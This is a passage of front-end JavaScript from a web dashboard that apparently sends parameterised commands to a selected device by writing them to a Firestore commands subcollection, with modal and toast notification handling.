                document.getElementById('modalSendBtn').textContent = 'Send';
            }

            document.getElementById('modalOverlay').classList.add('show');
        }

        function closeModal() {
            document.getElementById('modalOverlay').classList.remove('show');
            pendingModalCommand = null;
        }

        // ============================================================
        // EXECUTE MODAL COMMAND
        // ============================================================
        function executeModalCommand() {
            if (!pendingModalCommand) return;
            if (!selectedDeviceId) {
                showToast('No device selected', 'error');
                return;
            }

            const cmd = pendingModalCommand;
            const params = {};

            cmd.params.forEach(p => {
                const el = document.getElementById(`param_${p.key}`);
                if (el) {
                    let val = el.value;
                    if (p.type === 'number') val = parseFloat(val);
                    params[p.key] = val;
                }
            });

            const payload = {
                type: cmd.name,
                params: params,
                timestamp: firebase.firestore.FieldValue.serverTimestamp(),
                status: 'pending'
            };

            // Write to device's commands subcollection
            const cmdRef = db.collection('devices').doc(selectedDeviceId).collection('commands').doc();
            cmdRef.set(payload)
                .then(() => {
                    showToast(`${cmd.label} command sent`, 'success');
                    closeModal();
                })
                .catch(err => {
                    showToast(`Error: ${err.message}`, 'error');
                });
        }

        // ============================================================
        // TOAST
        // ============================================================
        function showToast(msg, type) {
            const el = document.getElementById('toast');
            el.textContent = msg;
            el.className = 'toast show';
            if (type) el.classList.add(type);
            clearTimeout(el._timeout);
            el._timeout = setTimeout(() => { el.classList.remove('show'); }, 3000);
        }

        // Click outside modal to close
        document.getElementById('modalOverlay').addEventListener('click', function(e) {
            if (e.target === this) closeModal();
        });
    </script>
